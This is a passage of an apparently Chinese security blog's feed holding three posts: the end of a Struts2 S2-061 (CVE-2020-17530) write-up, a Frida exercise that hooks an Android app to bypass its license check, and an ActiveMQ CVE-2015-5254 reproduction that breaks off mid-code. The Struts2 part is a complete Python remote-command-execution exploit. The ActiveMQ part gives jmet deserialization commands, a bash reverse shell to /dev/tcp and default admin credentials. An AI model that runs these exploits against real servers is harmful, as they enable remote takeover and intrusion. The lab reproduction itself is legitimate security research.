class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">url,cmd</span>):</span></span><br><span class="line">    payload=<span class="string">&quot;%25%7b(%27ol4three%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27&quot;</span>+cmd+<span class="string">&quot;%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d&quot;</span></span><br><span class="line">    tturl=url+<span class="string">&quot;/?id=&quot;</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line"><span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">&#x27;//a[@id]/@id&#x27;</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ EXP: python struts2-061-poc.py http://1.1.1.1:8081 id      +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ VER: Struts 2.0.0-2.5.25                                   +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;+------------------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&quot;[+]ussage: http://ip:port command&quot;</span>)</span><br><span class="line">        print(<span class="string">&quot;[+]============================================================&quot;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">exp(url,cmd)</span><br></pre></td></tr></table></figure><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216203912346.png" alt="image-20201216203912346"></p><h4 id="Goby-poc-开发界面"><a href="#Goby-poc-开发界面" class="headerlink" title="Goby poc 开发界面"></a>Goby poc 开发界面</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216204623455.png" alt="image-20201216204623455"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205437353.png" alt="image-20201216205437353"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205455850.png" alt="image-20201216205455850"></p><h4 id="单个漏洞验证"><a href="#单个漏洞验证" class="headerlink" title="单个漏洞验证"></a>单个漏洞验证</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205525154.png" alt="image-20201216205525154"></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>将Apache Struts框架升级至最新版本</p><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-061">https://cwiki.apache.org/confluence/display/WW/S2-061</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew">https://mp.weixin.qq.com/s/rcfXIBSpNtgCFua0yUK_ew</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="struts2" scheme="http://www.ol4three.com/tags/struts2/"/>
    
  </entry>
  
  <entry>
    <title>Hook框架Frida练习（1）</title>
    <link href="http://www.ol4three.com/2020/12/04/Android/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/"/>
    <id>http://www.ol4three.com/2020/12/04/Android/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/</id>
    <published>2020-12-04T12:17:37.000Z</published>
    <updated>2020-12-17T13:08:20.621Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文章涉及到的知识点："><a href="#文章涉及到的知识点：" class="headerlink" title="文章涉及到的知识点："></a>文章涉及到的知识点：</h2><ul><li>怎么使用javascript实例化类并调用类方法</li><li>怎么在”jscode”中增加自定义javascript方法</li><li>怎么较为灵活的hook类方法</li></ul><h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure><p>apk的下载地址：<a href="https://github.com/ghostmaze/Android-Reverse/raw/master/WhyShouldIPay/WhyShouldIPay.apk">whyshouldIpay</a></p><h2 id="0x02-APK的简单分析"><a href="#0x02-APK的简单分析" class="headerlink" title="0x02 APK的简单分析"></a>0x02 APK的简单分析</h2><h3 id="1-安装APK"><a href="#1-安装APK" class="headerlink" title="1.安装APK"></a>1.安装APK</h3><p>下载apk安装，先看看是什么功能，简单的使用后，了解到<code>PREMIUM CONETNT</code>内容需要输入License验证后才能查看。<code>PREMIUM CONETNT</code>按钮中的内容应该是答案。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204346213.png" alt="image-20201217204346213" style="zoom: 33%;"><h3 id="2-流程分析"><a href="#2-流程分析" class="headerlink" title="2.流程分析"></a>2.流程分析</h3><p>使用jadx将apk反编译出来，分析，在AndroidManifest.xml中找到了启动的Activity是<code>LauncherActivity</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204804697.png" alt="image-20201217204804697"></p><p>找到其中的主要代码进行分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public void verifyClick(View v) &#123;</span><br><span class="line">&#x2F;&#x2F;第一个验证，将输入的Licese通过网络验证，但这个肯定是通不过的，这是一个可能需要绕过的点。</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream in &#x3D; new URL(&quot;http:&#x2F;&#x2F;broken.license.server.com&#x2F;query?license&#x3D;&quot; + ((EditText) findViewById(R.id.text_license)).getText().toString()).openConnection().getInputStream();</span><br><span class="line">           StringBuilder responseBuilder &#x3D; new StringBuilder();</span><br><span class="line">           byte[] b &#x3D; new byte[0];</span><br><span class="line">           while (in.read(b) &gt; 0) &#123;</span><br><span class="line">               responseBuilder.append(b);</span><br><span class="line">           &#125;</span><br><span class="line">           String response &#x3D; responseBuilder.toString();</span><br><span class="line">           &#x2F;&#x2F;网络验证需要服务器返回 &quot;LICENSEKEYOK&quot;，才能进行下一步</span><br><span class="line">           if (response.equals(&quot;LICENSEKEYOK&quot;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;当网络验证成功后，生成激活秘钥，并写入到preferences文件中</span><br><span class="line">               String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br><span class="line">               SharedPreferences.Editor editor &#x3D; getApplicationContext().getSharedPreferences(&quot;preferences&quot;, 0).edit();</span><br><span class="line">               editor.putString(&quot;KEY&quot;, activatedKey);</span><br><span class="line">               &#x2F;&#x2F;这样便成功激活</span><br><span class="line">               editor.commit();</span><br><span class="line">               new AlertDialog.Builder(this).setTitle(&quot;Activation successful&quot;).setMessage(&quot;Activation successful&quot;).setIcon(17301543).show();</span><br><span class="line">               return;</span><br><span class="line">           &#125;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Invalid license!&quot;).setMessage(&quot;Invalid license!&quot;).setIcon(17301543).show();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Error occured&quot;).setMessage(&quot;Server unreachable&quot;).setNeutralButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).setIcon(17301543).show();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在<code>verifyClick</code>中可以知道生成激活秘钥的算法是<code>MainActivity.xor</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br></pre></td></tr></table></figure><p>到<code>MainActivity</code>中，查看该方法，看上去算起来还是比较麻烦。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来当程序被激活成功后，点击<code>PREMIUM CONETNT</code>按钮，会调用<code>MainActivity</code>中的方法，可以看到它将MAC，以及生成的Key发送到了<code>MainActivity</code>中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void showPremium(View view) &#123;</span><br><span class="line">       Intent i &#x3D; new Intent(this, MainActivity.class);</span><br><span class="line">       i.putExtra(&quot;MAC&quot;, getMac());</span><br><span class="line">       i.putExtra(&quot;KEY&quot;, getKey());</span><br><span class="line">       startActivity(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在<code>MainActivity</code>的<code>onCreate</code>方法中，看到了最终答案生成的native方法<code>stringFromJNI(key, mac)</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"> &#x2F;&#x2F;获取Intent传递过来的值</span><br><span class="line">        String key &#x3D; getIntent().getStringExtra(&quot;KEY&quot;);</span><br><span class="line">        String mac &#x3D; getIntent().getStringExtra(&quot;MAC&quot;);</span><br><span class="line">        if (key &#x3D;&#x3D; &quot;&quot; || mac &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            key &#x3D; &quot;&quot;;</span><br><span class="line">            mac &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((int) R.layout.activity_main);</span><br><span class="line">     &#x2F;&#x2F;调用native函数，算出答案</span><br><span class="line">        ((TextView) findViewById(R.id.sample_text)).setText(stringFromJNI(key, mac));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>大概过程如下：</p><ol><li>输入License，进行验证</li><li>通过网络验证获取返回值“LICENSEKEYOK”后，然后调用<code>MainActivity.xor</code>在本地<code>preferences</code>文件中生成秘钥，激活成功。</li><li>本地获取MAC地址及秘钥Key传入<code>MainActivity</code>得出答案。</li></ol><h3 id="对hook点进行分析"><a href="#对hook点进行分析" class="headerlink" title="对hook点进行分析"></a>对hook点进行分析</h3><ol><li>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</li><li>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</li><li>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</li></ol><h3 id="代码的构造与编写"><a href="#代码的构造与编写" class="headerlink" title="代码的构造与编写"></a>代码的构造与编写</h3><h4 id="hook-getMac-函数"><a href="#hook-getMac-函数" class="headerlink" title="hook getMac()函数"></a>hook getMac()函数</h4><p>getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">js_code = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var hook_Activity = Java.use(&#x27;</span>de.fraunhofer.sit.premiumapp.LauncherActivity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        hook_Activity.showPremium.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            var Key = this.getKey();</span></span><br><span class="line"><span class="string">            var Mac = this.getMac();</span></span><br><span class="line"><span class="string">            send(Key);</span></span><br><span class="line"><span class="string">            send(Mac);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>完整的Python代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        hook_Activity.showPremium.implementation &#x3D; function(v)&#123;</span><br><span class="line">            var Key &#x3D; this.getKey();</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            send(Key);</span><br><span class="line">            send(Mac);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)</span><br><span class="line">script &#x3D; process.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217210711185.png" alt="image-20201217210711185"></p><p>更新中…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;文章涉及到的知识点：&quot;&gt;&lt;a href=&quot;#文章涉及到的知识点：&quot; class=&quot;headerlink&quot; title=&quot;文章涉及到的知识点：&quot;&gt;&lt;/a&gt;文章涉及到的知识点：&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;怎么使用javascript实例化类并调用类方法&lt;/li&gt;
&lt;l
      
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ漏洞复现和分析（CVE-2015-5254）</title>
    <link href="http://www.ol4three.com/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/"/>
    <id>http://www.ol4three.com/2020/12/04/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90%EF%BC%88CVE-2015-5254%EF%BC%89/</id>
    <published>2020-12-04T12:04:13.000Z</published>
    <updated>2020-12-17T06:49:17.233Z</updated>
    
    <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务，集群，Spring Framework等。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache ActiveMQ 5.13.0之前5.x版本中</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="漏洞指纹"><a href="#漏洞指纹" class="headerlink" title="漏洞指纹"></a>漏洞指纹</h2><p>使用namp对目标进行扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV IP -p 8161,61616</span><br></pre></td></tr></table></figure><p>扫描结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Host is up (0.00029s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">8161&#x2F;tcp  open  http     Jetty 8.1.16.v20140903</span><br><span class="line">61616&#x2F;tcp open  apachemq ActiveMQ OpenWire transport</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port61616-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;12&#x2F;13%Time&#x3D;5FD5DA4A%P&#x3D;x86_64-apple-darwin19.</span><br><span class="line">SF:0.0%r(NULL,F4,&quot;\0\0\0\xf0\x01ActiveMQ\0\0\0\n\x01\0\0\0\xde\0\0\0\t\0\x</span><br><span class="line">SF:0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\tCacheSize\x05\0\0\x04\0\0\x0cCac</span><br><span class="line">SF:heEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\x20MaxInactivityDurat</span><br><span class="line">SF:ionInitalDelay\x06\0\0\0\0\0\0&#39;\x10\0\x11TcpNoDelayEnabled\x01\x01\0\x1</span><br><span class="line">SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x14TightEncodingEnabled\x01\</span><br><span class="line">SF:x01\0\x11StackTraceEnabled\x01\x01&quot;);</span><br></pre></td></tr></table></figure><h2 id="默认口令漏洞"><a href="#默认口令漏洞" class="headerlink" title="默认口令漏洞"></a>默认口令漏洞</h2><p>ActiveMQ默认口令是admin/admin 登陆后可以看到对应的版本信息。<strong>放序列化需要登陆后才能触发，任意文件上传访问webshell需要登录</strong></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201213171426069.png" alt="image-20201213171426069"></p><h2 id="反序列化漏洞-CVE-2015-5254"><a href="#反序列化漏洞-CVE-2015-5254" class="headerlink" title="反序列化漏洞(CVE-2015-5254)"></a>反序列化漏洞(CVE-2015-5254)</h2><p>漏洞利用过程如下：</p><p>a.构造(可以使用ysoserial)可执行命令的序列化对象</p><p>b.作为一个消息，发送给目标的61616端口</p><p>c.访问Web管理界面，读取消息触发漏洞</p><p>jmet的jar文件（这里windows和linux都经过了测试，windows在 “1.8.0_241”版本中可利用成功，linux在”11.0.7“不可以，应该是java版本导致的原因）</p><p><a href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">下载jmet</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch &#x2F;tmp&#x2F;sucess&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure><p>发送成功如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:ol4three-55063-1607996494671-0:1</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Sent gadget &quot;ROME&quot; with command: &quot;touch &#x2F;tmp&#x2F;sucess&quot;</span><br><span class="line">INFO d.c.j.t.JMSTarget [main] Shutting down connection ID:ol4three-55063-1607996494671-0:1</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215095044834.png" alt="image-20201215095044834"></p><p>点击队列即可触发（如果没有弱口令，可写入后等待管理员点击触发），可成功执行建立文件的命令，这里可通过以下命令进入docker查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exec -it 609d53eb4f5a &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215101659372.png" alt="image-20201215101659372"></p><p>反弹shell需要在<a href="http://www.jackson-t.ca/runtime-exec-payloads.html">这里</a>将bash反弹命令进行编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;IP&#x2F;端口 0&gt;&amp;1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;编码后的反弹命令&quot; -Yp ROME 目标IP 61616</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215105651639.png" alt="image-20201215105651639"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞触发流程如下</p><p><strong>ObjectMessage.setObject() -&gt;MessageProducer.send()→MessageConsumer.recive()→ObjectMessage.getObject()</strong></p><p>下面是setObject()和getObject()的操作接口</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150520127.png" alt="image-20201215150520127"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215150819658.png" alt="image-20201215150819658"></p><p>这里为序列化操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(ObjectOutputStream s) throws IOException &#123;</span><br><span class="line"> int sshift &#x3D; 0;</span><br><span class="line"> int ssize &#x3D; 1;</span><br><span class="line"> while (ssize &lt; 16) &#123;</span><br><span class="line"> sshift++;</span><br><span class="line"> ssize &lt;&lt;&#x3D; 1;</span><br><span class="line"> &#125; </span><br><span class="line"> int segmentShift &#x3D; 32 - sshift;</span><br><span class="line"> int segmentMask &#x3D; ssize - 1;</span><br><span class="line"> Segment[] segments &#x3D; (Segment[])new Segment[16];</span><br><span class="line"> for (int i &#x3D; 0; i &lt; segments.length; i++)</span><br><span class="line"> segments[i] &#x3D; new Segment(0.75F); </span><br><span class="line"> s.putFields().put(&quot;segments&quot;, segments);</span><br><span class="line"> s.putFields().put(&quot;segmentShift&quot;, segmentShift);</span><br><span class="line"> s.putFields().put(&quot;segmentMask&quot;, segmentMask);</span><br><span class="line"> s.writeFields();</span><br><span class="line"> Node[] arrayOfNode;</span><br><span class="line"> if ((arrayOfNode &#x3D; this.table) !&#x3D; null) &#123;</span><br><span class="line"> Traverser&lt;K, V&gt; it &#x3D; new Traverser&lt;K, V&gt;(arrayOfNode, arrayOfNode.length, 0, arrayOfNode.length); Node&lt;K, </span><br><span class="line">V&gt; p;</span><br><span class="line"> while ((p &#x3D; it.advance()) !&#x3D; null) &#123;</span><br><span class="line"> s.writeObject(p.key);</span><br><span class="line"> s.writeObject(p.val);</span><br><span class="line"> &#125; </span><br><span class="line"> &#125; </span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> s.writeObject(null);</span><br><span class="line"> segments &#x3D; null;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201215170349015.png" alt="image-20201215170349015"></p><p>getObject()方法会调用readobject()方法中将data中的数据进行反序列化并且触发漏洞</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 